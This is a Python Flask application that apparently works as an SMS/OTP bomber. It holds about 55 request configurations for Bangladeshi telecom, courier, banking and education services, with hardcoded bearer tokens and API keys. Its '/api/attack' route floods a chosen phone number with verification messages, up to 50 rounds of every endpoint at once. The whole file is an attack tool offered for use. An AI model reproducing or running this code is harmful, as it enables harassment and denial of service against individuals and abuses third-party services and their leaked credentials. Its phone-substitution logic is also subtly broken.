from flask import Flask, render_template, request, jsonify
import requests
import concurrent.futures
import random

app = Flask(__name__)

# ============================================================
#  ৬১টি API কনফিগারেশন (বাংলাদেশি সার্ভিস)
# ============================================================
API_CONFIGS = [
    # 1. paperfly
    {
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "method": "POST",
        "data": {"phone_number": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://go.paperfly.com.bd",
            "Referer": "https://go.paperfly.com.bd/"
        }
    },
    # 2. ghoori
    {
        "url": "https://api.ghoorilearning.com/api/auth/signup/otp",
        "method": "POST",
        "data": {"mobile_no": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://ghoorilearning.com",
            "Referer": "https://ghoorilearning.com/"
        }
    },
    # 3. doctime
    {
        "url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",
        "method": "POST",
        "data": {
            "data": {
                "country_calling_code": "88",
                "contact_no": "",
                "headers": {"PlatForm": "Web"}
            }
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://doctime.com.bd",
            "Referer": "https://doctime.com.bd/"
        }
    },
    # 4. sundarban (GraphQL)
    {
        "url": "https://api-gateway.sundarbancourierltd.com/graphql",
        "method": "POST",
        "data": {
            "operationName": "CreateAccessToken",
            "variables": {"accessTokenFilter": {"userName": ""}},
            "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://customer.sundarbancourierltd.com",
            "Referer": "https://customer.sundarbancourierltd.com/"
        }
    },
    # 5. apex ✅
    {
        "url": "https://api.apex4u.com/api/auth/login",
        "method": "POST",
        "data": {"phoneNumber": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://apex4u.com",
            "Referer": "https://apex4u.com/"
        }
    },
    # 6. robi
    {
        "url": "https://webapi.robi.com.bd/v1/send-otp",
        "method": "POST",
        "data": {"phone_number": "", "type": "doorstep"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc"
        }
    },
    # 7. banglalink_validation (GET)
    {
        "url": "https://web-api.banglalink.net/api/v1/user/number/validation/",
        "method": "GET",
        "data": {},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://banglalink.net",
            "Referer": "https://banglalink.net/"
        }
    },
    # 8. banglalink_otp
    {
        "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request",
        "method": "POST",
        "data": {"mobile": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://banglalink.net",
            "Referer": "https://banglalink.net/",
            "client-security-token": "1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ"
        }
    },
    # 9. grameenphone
    {
        "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "data": {"msisdn": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.grameenphone.com",
            "Referer": "https://www.grameenphone.com/"
        }
    },
    # 10. robi_chat
    {
        "url": "https://webapi.robi.com.bd/v1/chat/send-otp",
        "method": "POST",
        "data": {"phone_number": "", "name": "Johny Singh", "type": "video-chat"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI",
            "X-CSRF-TOKEN": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI"
        }
    },
    # 11. robi_da
    {
        "url": "https://da-api.robi.com.bd/da-nll/otp/send",
        "method": "POST",
        "data": {"msisdn": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 12. redx_reg
    {
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "data": {"phoneNumber": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://redx.com.bd",
            "Referer": "https://redx.com.bd/"
        }
    },
    # 13. fundesh
    {
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "data": {"msisdn": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json; charset=UTF-8",
            "Origin": "https://fundesh.com.bd",
            "Referer": "https://fundesh.com.bd/fundesh/profile"
        }
    },
    # 14. bikroy (GET)
    {
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login",
        "method": "GET",
        "data": {"phone": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://bikroy.com/"
        }
    },
    # 15. motionview
    {
        "url": "https://api.motionview.com.bd/api/send-otp-phone-signup",
        "method": "POST",
        "data": {"phone": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://motionview.com.bd",
            "Referer": "https://motionview.com.bd/"
        }
    },
    # 16. chorki
    {
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "data": {"number": "+88"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.chorki.com",
            "Referer": "https://www.chorki.com/"
        }
    },
    # 17. jatri
    {
        "url": "https://user-api.jslglobal.co:444/v2/send-otp",
        "method": "POST",
        "data": {"phone": "+88", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://rental.jatri.co",
            "Referer": "https://rental.jatri.co/"
        }
    },
    # 18. chinaonline (GET)
    {
        "url": "https://chinaonlinebd.com/api/login/getOtp",
        "method": "GET",
        "data": {"phone": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "token": "45601f3d391886fcec5f5a3f26780f21",
            "Referer": "https://chinaonlinebd.com/login?next=/dashboard"
        }
    },
    # 19. bikash
    {
        "url": "https://us-central1-bikash-227008.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",
        "method": "POST",
        "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "x-api-key": "036585149692514125"
        }
    },
    # 20. shikho
    {
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "data": {"mobile": "", "reason": "LOGIN", "vendor": "shikho"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://shikho.com",
            "Referer": "https://shikho.com/"
        }
    },
    # 21. redx_signup
    {
        "url": "https://api.redx.com.bd/v1/user/signup",
        "method": "POST",
        "data": {"name": "961096106", "phoneNumber": "", "service": "redx"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://redx.com.bd",
            "Referer": "https://redx.com.bd/registration/"
        }
    },
    # 22. bikroy_alt (GET)
    {
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login",
        "method": "GET",
        "data": {},
        "params": {"phone": ""}
    },
    # 23. bioscope
    {
        "url": "https://www.bioscopelive.com/en/login/send-otp",
        "method": "POST",
        "data": {"phone": "88", "operator": "bd-otp"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    },
    # 24. bikroy_cloud
    {
        "url": "https://us-central1-bikroy-478a5.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",
        "method": "POST",
        "data": {"contact_no": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://bikroy.com"
        }
    },
    # 25. epathagar
    {
        "url": "https://us-central1-e-pathagar-56b27.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",
        "method": "POST",
        "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://e-pathagar.com",
            "Referer": "https://e-pathagar.com/"
        }
    },
    # 26. pathao
    {
        "url": "https://us-central1-pathao-41616.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",
        "method": "POST",
        "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://go.pathao.com",
            "Referer": "https://go.pathao.com/"
        }
    },
    # 27. bikash_web
    {
        "url": "https://www.bikash.com/send-otp",
        "method": "POST",
        "data": {"mobileNumber": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Referer": "https://www.bikash.com/"
        }
    },
    # 28. ekshop
    {
        "url": "https://ekshop.com.bd/v3/api/auth/register-otp",
        "method": "POST",
        "data": {"mobile_number": "", "type": "customer", "token": "473c22b102b7ec9992f0ddb853503460"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 29. easy
    {
        "url": "https://core.easy.com.bd/api/v1/registration",
        "method": "POST",
        "data": {"name": "Limon Islam", "email": "uyrlhkgxqw@emergentvillage.org", "mobile": "", "password": "boss#2022", "password_confirmation": "boss#2022", "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Referer": "https://easy.com.bd/"
        }
    },
    # 30. banglalink_eshop
    {
        "url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp",
        "method": "POST",
        "data": {"type": "phone", "phone": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 31. fsibl
    {
        "url": "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber",
        "method": "POST",
        "data": {"AccessToken": "", "TrackingNo": "", "mobileNo": "", "otpSms": "", "product_id": "122", "requestChannel": "MOB", "trackingStatus": 5},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 32. shomvob
    {
        "url": "https://api.shomvob.co/api/v2/otp/phone?is_retry=0",
        "method": "POST",
        "data": {"phone": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"
        }
    },
    # 33. bongobd
    {
        "url": "https://apps.bongobd.com/api/v1/auth/otp-login/send-otp",
        "method": "POST",
        "data": {"cli": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 34. jatri_alt
    {
        "url": "https://user-api.jslglobal.co:444/v1/send-otp",
        "method": "POST",
        "data": {"phone": "+88", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://rental.jatri.co",
            "Referer": "https://rental.jatri.co/"
        }
    },
    # 35. mcbaffiliate
    {
        "url": "https://www.mcbaffiliate.com/Affiliate/RequestOTP",
        "method": "POST",
        "data": {"PhoneNumber": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    },
    # 36. mithaibd
    {
        "url": "https://mithaibd.com/api/login/?lang_code=en&currency_code=BDT",
        "method": "POST",
        "data": {"company_id": "2", "password2": "Rahu333@@", "currency_code": "BDT", "user_type": "C", "email": "fuckyoubro@gmail.com", "g_id": "", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Rahu333@@", "phone": "", "storefront_id": "5"},
        "headers": {
            "User-Agent": "okhttp/4.2.2",
            "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==",
            "Content-Type": "application/json"
        }
    },
    # 37. englishmoja
    {
        "url": "https://api.englishmojabd.com/api/v1/auth/login",
        "method": "POST",
        "data": {"phone": "+88"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 38. moveon
    {
        "url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp",
        "method": "POST",
        "data": {"phone": "", "login_type": "signup"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://moveon.com.bd",
            "Referer": "https://moveon.com.bd/"
        }
    },
    # 39. pathao_api
    {
        "url": "https://api.pathao.com/api/v1/auth/request-otp",
        "method": "POST",
        "data": {"phone": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "X-Device-Id": "2334812",
            "X-localization": "en"
        }
    },
    # 40. bikroy_api
    {
        "url": "https://api.bikroy.com/api/v1/auth/send-otp",
        "method": "POST",
        "data": {"phone": "", "email": "limon@gmail.com", "password": "boss#2022"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 41. shikho_api
    {
        "url": "https://shikho.com/api/v1/auth/send-otp",
        "method": "POST",
        "data": {"phone": "", "reason": "login", "vendor": "shikho"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 42. qcoom
    {
        "url": "https://auth.qcoom.com/api/v1/otp/send",
        "method": "POST",
        "data": {"mobileNumber": "+88"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Referer": "https://qcoom.com/"
        }
    },
    # 43. circle
    {
        "url": "https://reseller.circle.com.bd/api/v2/auth/signup",
        "method": "POST",
        "data": {"name": "+88", "email_or_phone": "+88", "password": "123456lmn", "password_confirmation": "123456lmn", "register_by": "phone"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 44. shomvob_backend
    {
        "url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
        "method": "POST",
        "data": {"phone": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"
        }
    },
    # 45. sundarban_alt (GraphQL)
    {
        "url": "https://api-gateway.sundarbancourierltd.com/graphql",
        "method": "POST",
        "data": {
            "operationName": "CreateAccessToken",
            "variables": {"accessTokenFilter": {"userName": ""}},
            "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Host": "api-gateway.sundarbancourierltd.com",
            "Referer": "https://customer.sundarbancourierltd.com/",
            "Origin": "https://customer.sundarbancourierltd.com"
        }
    },
    # 46. toybox
    {
        "url": "https://api.toybox.com.bd/v1/auth/request-otp",
        "method": "POST",
        "data": {"phone": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Referer": "https://toybox.com.bd/"
        }
    },
    # 47. bongobd_alt
    {
        "url": "https://apps.bongobd.com/api/v1/auth/otp-login/send-otp",
        "method": "POST",
        "data": {"cli": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 48. moveon_alt
    {
        "url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp",
        "method": "POST",
        "data": {"phone": "", "login_type": "signup"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 49. bikash_web_alt
    {
        "url": "https://www.bikash.com/send-otp",
        "method": "POST",
        "data": {"mobileNumber": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Referer": "https://www.bikash.com/"
        }
    },
    # 50. rootsedu
    {
        "url": "https://rootsedulive.com/api/auth/forget-password",
        "method": "POST",
        "data": {"phoneOrEmail": "88"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    },
    # 51. mcbaffiliate_alt
    {
        "url": "https://www.mcbaffiliate.com/Affiliate/RequestOTP",
        "method": "POST",
        "data": {"PhoneNumber": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    },
    # 52. hishabee
    {
        "url": "https://app.hishabee.business/api/V2/otp/send",
        "method": "POST",
        "data": {},
        "params": {"mobile_number": ""},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 53. bkshop
    {
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "data": {"phone": "", "email": "", "language": "en"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
    },
    # 54. mygp_1 (GET)
    {
        "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp",
        "method": "GET",
        "data": {},
        "params": {"mobile": "", "otp_type": "REGISTER", "user_type": "PREPAID"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-REQUEST-ID": "10000",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhcHB1c2VyIiwidHlwZSI6IkFQUF9VSUQifQ.yF2-l1X_o2QJv9y9H7m0n9_P14g1G7Q07A_8i3P719A",
            "X-GP-APP-VERSION": "4.15.0"
        }
    },
    # 55. mygp_2 (GET)
    {
        "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp",
        "method": "GET",
        "data": {},
        "params": {"mobile": "", "otp_type": "REGISTER", "user_type": "PREPAID"},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-REQUEST-ID": "10000",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhcHB1c2VyIiwidHlwZSI6IkFQUF9VSUQifQ.yF2-l1X_o2QJv9y9H7m0n9_P14g1G7Q07A_8i3P719A",
            "X-GP-APP-VERSION": "4.15.0"
        }
    }
]

# ============================================================
#  হেল্পার ফাংশন
# ============================================================
def send_request(api, phone):
    """একটি API তে রিকোয়েস্ট পাঠায়"""
    try:
        url = api["url"]
        method = api.get("method", "POST")
        payload = api["data"].copy()
        
        # পেলোডে ফোন নম্বর প্রতিস্থাপন
        for key in payload:
            if isinstance(payload[key], str):
                payload[key] = payload[key].replace("", phone) if "" in payload[key] else phone
            elif isinstance(payload[key], dict):
                for sub_key in payload[key]:
                    if isinstance(payload[key][sub_key], str):
                        if "" in payload[key][sub_key]:
                            payload[key][sub_key] = payload[key][sub_key].replace("", phone)
                        elif payload[key][sub_key] == "":
                            payload[key][sub_key] = phone
        
        headers = api.get("headers", {})
        headers["User-Agent"] = headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        
        params = api.get("params", {})
        if params:
            for key in params:
                if isinstance(params[key], str) and "" in params[key]:
                    params[key] = params[key].replace("", phone)
        
        if method.upper() == "POST":
            response = requests.post(url, json=payload, headers=headers, params=params, timeout=10)
        else:
            response = requests.get(url, headers=headers, params=params, timeout=10)
        
        return {"success": response.status_code in [200, 201, 202, 204], "status": response.status_code}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ============================================================
#  Flask রাউট
# ============================================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/attack', methods=['POST'])
def attack():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    amount = data.get('amount', 1)
    
    if not phone or len(phone) < 10:
        return jsonify({"error": "Invalid phone number"}), 400
    
    if amount > 50:
        amount = 50
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_api = {}
        for _ in range(amount):
            for api in API_CONFIGS:
                future = executor.submit(send_request, api, phone)
                future_to_api[future] = api
        
        for future in concurrent.futures.as_completed(future_to_api):
            result = future.result()
            results.append(result)
    
    success_count = sum(1 for r in results if r.get("success", False))
    
    return jsonify({
        "total": len(results),
        "success": success_count,
        "failed": len(results) - success_count,
        "results": results
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)